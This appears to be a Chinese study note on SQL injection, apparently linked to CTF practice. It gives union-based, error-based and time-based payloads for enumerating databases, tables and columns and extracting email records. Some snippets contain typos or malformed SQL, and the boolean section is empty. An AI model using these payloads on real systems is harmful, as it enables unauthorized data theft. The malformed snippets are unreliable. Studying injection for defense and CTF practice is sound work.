## Union注入攻击

### 判断字段长度
使用order by num。其中num指的就是第几列，由于不存在第几行就会报错。比如 order by 4，这个就是指的是按照第四列排序，如果不存在第四行就会报错
### 判断相关字段类型
使用order by num 可以获取到有几列数据，现在就要获取到每列数据的数据类型。比如上面获取到的是四列数据。则这里就是用

```sql
union select 1,2,3,4 
```


看返回的是哪个数字就可以确认对应的列是可以返回数据的。
### 获取数据
已经获取到了4列数据，并且确认返回的是3，即

```sql
union select 1,2,3,4 
```


返回的是3则说明第三列可以存放变量的。
使用
#### 获取数据库

```sql
id=1 union select 1,2,database(),4
```


成功返回当前使用的数据库，返回的是sql
#### 获取表的名字

```sql
unioon select 1,2,(select table_name from information_schema.tables table_name='sql' limit 0,1),4
```


成功获取返回得到数据表，emails.同时修改limit n,m中的n和m就可以得到不同的表名。
#### 获取字段名  
以emails表为例子。  
1. 查询information_schema中对应的数据

```sql
union select 1,2,(select column_name from information_schema.columns where table_schema='sql' and table_name = 'emails' limit 0,1;),3
```  
2. 使用describe table获取表的数据  
```sql
describe table_name 
```


修改limit值就可以得到全部的字段名

#### 查询数据
现在已经知道了数据库的名字、数据表的名字、字段的名字，要想获取到数据就变得很简单的。以上面获取到的数据库、数据表、字段为例。

```sql
    union select 1,2,(select email_id from sql.emails limit 0,1)
```


修改limit就可以获取到全部的数据


## 报错注入攻击
当sql语句出现错误的时候，如果前端没有进行过滤，就会将报错信息显示出到前端来。所以报错注入的本质，就是从报错中获取信息。
使用updatexml与extractvalue进行注入
updatexml与extractvalue是什么？可以看[这篇文章](https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html).  
简单来说，就是在执行函数的时候，会自动去执行参数字符串。如果字符串参数的内容不符合xpath语法，那么就会报错。
[例题](../CTF题目/2_sql注入之报错注入.md)


## boolean注入

返回结果，只有两种情况，比如




## 时间注入
时间注入与boolean注入非常相近，也可以看成是boolean注入的一个子分支。它与Boolean注入的不同之处在于，时间注入是利用sleep() 或benchmark（）等函数让MySQL的执行时间变长。也就是boolean是使用了选择语句，但是时间注入的选择语句中如果被执行，那么就会比平时花费更多的时间，所以也就是两种情况，一条注入语句的执行时间有没有边长。比如下面这条sql语句
1. 利用时间注入查询数据库长度

```sql
    IF(length(database())>1,sleep(5),1)
```


语句的作用在于如果数据库库名的长度大于1 ，则MySQL查询休眠5秒，否则查询1。其中查询l的结果， 大约只有几十毫秒，根据Burp Suite中页面的响应时间，可以判 断条件是否正确。
2. 利用时间注入查询数据库名字

```sql
if(substr(database(),1,1)='s',sleep(5),1)
```


查询当前用户数据库的第一个字母是不是‘s’，如果是s则会暂停5秒
